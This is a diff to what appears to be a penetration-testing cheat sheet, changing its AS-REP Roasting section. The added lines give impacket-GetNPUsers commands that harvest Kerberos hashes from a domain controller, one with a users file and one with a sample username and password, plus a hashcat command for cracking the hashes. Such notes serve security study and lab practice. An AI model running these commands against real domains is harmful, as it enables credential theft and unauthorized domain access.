@@ -340,11 +340,13 @@ klist
 ```
 #### AS-REP Roasting(Require Do not require Kerberos preauthentication enabled)
 ```
-Linux way:
+ASREPRoast with username list without pass:
+impacket-GetNPUsers nara-security.com/ -dc-ip 192.168.209.30 -usersfile users.txt -format hashcat -outputfile hashes.txt
 
-Enum users with Do not require Kerberos preauthentication enabled
-PowerView's Get-DomainUser function with the option -PreauthNotRequired
-kali: impacket-GetNPUsers -dc-ip 192.168.50.70  -request -outputfile hashes.asreproast domain/username:pass
+ASREPRoast with credential:
+impacket-GetNPUsers nagoya-industries.com/Fiona.clark:Summer2023 -dc-ip 192.168.183.21  -request -outputfile hashes.asreproast 
+
+hashcat -m 18200 -a 0 passwords_kerb.txt hashes.asreproast
 ```
 ```
 Windows way:
